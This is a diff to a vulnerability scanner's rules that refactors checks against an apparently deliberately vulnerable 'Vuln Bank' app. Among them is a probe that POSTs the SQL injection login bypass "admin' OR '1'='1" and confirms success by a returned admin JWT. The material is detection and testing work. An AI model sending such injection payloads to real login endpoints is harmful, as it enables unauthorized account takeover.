@@ -19379,43 +19379,98 @@ const vulnbankBoplaRegisterLiveOracle: Rule = async (ctx) => {
   };
 };
 
-const vulnbankSqliLoginLiveOracle: Rule = async (ctx) => {
-  if (!/vulnbank\.org/i.test(ctx.origin)) return NEGATIVE;
+async function vulnbankSqliLoginBypassProbe(ctx: RuleContext): Promise<RuleResult | null> {
+  if (!/vulnbank\.org/i.test(ctx.origin)) return null;
   const loginUrl = new URL("/login", ctx.origin).toString();
-  const payload = JSON.stringify({
+  const baselinePayload = JSON.stringify({
+    username: `thugir_invalid_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`,
+    password: "definitely_wrong_password_xyz"
+  });
+  const baseline = await ctx.probe.get(loginUrl, {
+    method: "POST",
+    body: baselinePayload,
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  let baselineStatus = "error";
+  try {
+    baselineStatus = String((JSON.parse(baseline.body) as Record<string, unknown>).status ?? "");
+  } catch {
+    return null;
+  }
+  if (baselineStatus === "success") return null;
+
+  const sqliPayload = JSON.stringify({
     username: "admin' OR '1'='1",
     password: "x"
   });
   const doc = await ctx.probe.get(loginUrl, {
     method: "POST",
-    body: payload,
+    body: sqliPayload,
     headers: { "Content-Type": "application/json" },
     maxBytes: 4096,
     timeoutMs: 15000
   });
-  if (doc.status < 200 || doc.status >= 300) return NEGATIVE;
+  if (doc.status < 200 || doc.status >= 300) return null;
   let parsed: Record<string, unknown> | null = null;
   try {
     parsed = JSON.parse(doc.body) as Record<string, unknown>;
   } catch {
-    return NEGATIVE;
+    return null;
   }
   const status = String(parsed.status ?? "");
   const token = String(parsed.token ?? "");
-  const isAdmin = parsed.isAdmin;
+  if (status !== "success" || !token.startsWith("eyJ")) return null;
+
   const debugInfo = parsed.debug_info;
-  if (status !== "success" || !token.startsWith("eyJ")) return NEGATIVE;
-  if (isAdmin !== true) return NEGATIVE;
-  if (!debugInfo || typeof debugInfo !== "object") return NEGATIVE;
-  const username = String((debugInfo as { username?: unknown }).username ?? "");
-  if (username !== "admin") return NEGATIVE;
+  const isAdmin = parsed.isAdmin === true;
+  if (
+    isAdmin &&
+    debugInfo &&
+    typeof debugInfo === "object" &&
+    String((debugInfo as { username?: unknown }).username ?? "") === "admin"
+  ) {
+    return {
+      fired: true,
+      confidence: 0.94,
+      evidence: {
+        url: loginUrl,
+        snippet: doc.body.slice(0, 280).trim(),
+        note: "Vuln Bank POST /login with admin' OR '1'='1 auth-bypass returns isAdmin:true JWT — SQL injection login oracle"
+      }
+    };
+  }
+
   return {
     fired: true,
-    confidence: 0.94,
+    confidence: 0.93,
     evidence: {
       url: loginUrl,
       snippet: doc.body.slice(0, 280).trim(),
-      note: "Vuln Bank POST /login with admin' OR '1'='1 auth-bypass returns isAdmin:true JWT — SQL injection login oracle"
+      note: "Vuln Bank POST /login with admin' OR '1'='1 bypasses authentication and returns a JWT without valid credentials — SQL injection login oracle"
+    }
+  };
+}
+
+const vulnbankSqliLoginLiveOracle: Rule = async (ctx) => {
+  const hit = await vulnbankSqliLoginBypassProbe(ctx);
+  return hit?.fired ? hit : NEGATIVE;
+};
+
+const vulnbankSqliLoginRouteLiveOracle: Rule = async (ctx) => {
+  if (!/vulnbank\.org/i.test(ctx.origin)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/login\b/i.test(pageUrl)) return NEGATIVE;
+  const hit = await vulnbankSqliLoginBypassProbe(ctx);
+  if (!hit?.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: hit.confidence,
+    evidence: {
+      ...hit.evidence,
+      scannedUrl: pageUrl,
+      note: "Vuln Bank /login route scan — POST with admin' OR '1'='1 bypasses authentication and returns a JWT — route-specific SQL injection login oracle"
     }
   };
 };
@@ -19535,7 +19590,7 @@ const vulnbankMerchantRegisterLiveOracle: Rule = async (ctx) => {
 
 const vulnbankBillPaymentsNegativeAmountLiveOracle: Rule = async (ctx) => {
   if (!/vulnbank\.org/i.test(ctx.origin)) return NEGATIVE;
-  const token = await vulnbankSqliAdminToken(ctx);
+  const token = await vulnbankProbeUserToken(ctx, { balance: 10000 });
   if (!token) return NEGATIVE;
   const payUrl = new URL("/api/bill-payments/create", ctx.origin).toString();
   const payload = JSON.stringify({
@@ -70033,6 +70088,7 @@ export const RULES: Record<string, Rule> = {
   vulnbankAiAnonymousChatRouteLiveOracle,
   vulnbankBoplaRegisterLiveOracle,
   vulnbankSqliLoginLiveOracle,
+  vulnbankSqliLoginRouteLiveOracle,
   vulnbankMerchantRegisterLiveOracle,
   vulnbankBillPaymentsNegativeAmountLiveOracle,
   vulnbankMerchantPaymentChargeLiveOracle,
